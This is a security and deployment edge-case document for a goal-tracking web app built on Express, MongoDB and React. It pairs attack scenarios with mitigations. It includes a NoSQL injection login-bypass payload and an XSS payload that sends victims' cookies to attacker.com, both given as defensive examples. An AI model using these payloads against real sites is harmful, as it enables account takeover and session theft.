# Module 8 Edge Cases: Testing, Security Audits & Deployment

> **Module:** Module 8 — Testing, Security Audits & Deployment  
> **SRS Requirements:** Section 9, Section 12, Section 13, Section 14, Section 15  
> **Related Components:** Test Suites, Helmet, Rate Limiter, CORS, Input Sanitizer, Deployment Pipelines  

---

## 1. Security Vulnerabilities & Injection Attacks

### EC-8.1: NoSQL Injection Attacks via Request Query or Body
- **Scenario:** Attacker sends `{ "email": { "$gt": "" }, "password": "password123" }` to `/api/auth/login`.
- **Potential Failure:** MongoDB evaluates `$gt: ""` as matching all documents, potentially authenticating as the first user in the database without knowing their email.
- **Mitigation / Expected Handling:**
  - Enforce schema-level string types in validation middleware (e.g., `typeof email === 'string'`).
  - Sanitize inputs using `mongo-sanitize` to strip all `$` or `.` prefixed keys from `req.body`, `req.query`, and `req.params`.

### EC-8.2: Cross-Site Scripting (XSS) via Unsanitized User Content
- **Scenario:** Attacker creates a goal titled `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">` and invites a victim to a group goal.
- **Potential Failure:** When the victim opens the group goal, the malicious JavaScript executes in their browser context.
- **Mitigation / Expected Handling:**
  - React natively escapes interpolated strings in JSX (e.g. `{goal.title}`).
  - Never use `dangerouslySetInnerHTML` for user-generated content.
  - Set `Content-Security-Policy` (CSP) HTTP headers via `helmet`:
    ```javascript
    app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], ... } } }));
    ```

### EC-8.3: Regular Expression Denial of Service (ReDoS)
- **Scenario:** Malicious user submits an email address with 5,000 repeating characters (e.g., `aaaaa...aaaa@domain.com`) designed to cause catastrophic backtracking in poorly written regex validators.
- **Potential Failure:** Node event loop freezes for several seconds or minutes, stalling all requests.
- **Mitigation / Expected Handling:**
  - Use standard, proven validation libraries (e.g., `validator.js` inside `express-validator`).
  - Cap maximum string lengths before regex evaluation.

---

## 2. Testing Environment & Concurrency Edge Cases

### EC-8.4: Database State Pollution in Automated Test Suites
- **Scenario:** Test A writes a mock user to the database and fails to clean it up; Test B tries to register the same user and fails unexpectedly.
- **Potential Failure:** Flaky tests and false-negative test runs in CI/CD pipelines.
- **Mitigation / Expected Handling:**
  - Use `mongodb-memory-server` for test isolation.
  - Implement `beforeEach` / `afterEach` hooks in Jest to wipe collections between tests:
    ```javascript
    afterEach(async () => {
      const collections = mongoose.connection.collections;
      for (const key in collections) {
        await collections[key].deleteMany({});
      }
    });
    ```

### EC-8.5: Flaky Tests Due to Asynchronous Timers and Gemini AI Mocks
- **Scenario:** Tests make real network calls to Gemini AI during test execution, causing tests to fail when offline or hit rate limits.
- **Potential Failure:** Intermittent CI/CD failures, leaked API quota, slow test runs.
- **Mitigation / Expected Handling:**
  - Strictly mock the `geminiService.js` in unit and integration test runs (`jest.mock(...)`).
  - Provide deterministic JSON mock responses in tests.

---

## 3. Production Deployment & Runtime Edge Cases

### EC-8.6: Database Failover During Active HTTP Request
- **Scenario:** Primary MongoDB replica set member steps down during maintenance while backend is processing a contribution.
- **Mitigation / Expected Handling:**
  - Enable Mongoose retryable writes: `mongodb://...?retryWrites=true&w=majority`.
  - Wrap database operations in try-catch blocks that return HTTP 503 with `"Database temporarily unavailable. Please retry."`.

### EC-8.7: Client / Server Clock Desynchronization
- **Scenario:** User device's local clock is set 2 hours in the future or past.
- **Potential Failure:** Client-side JWT expiration checks or countdown timers calculate incorrect values.
- **Mitigation / Expected Handling:**
  - Token validity and deadline evaluation are always determined by server-side UTC timestamps (`Date.now()`).
  - Server sends current server timestamp in API responses (e.g., healthcheck or auth payload) for client sync if needed.
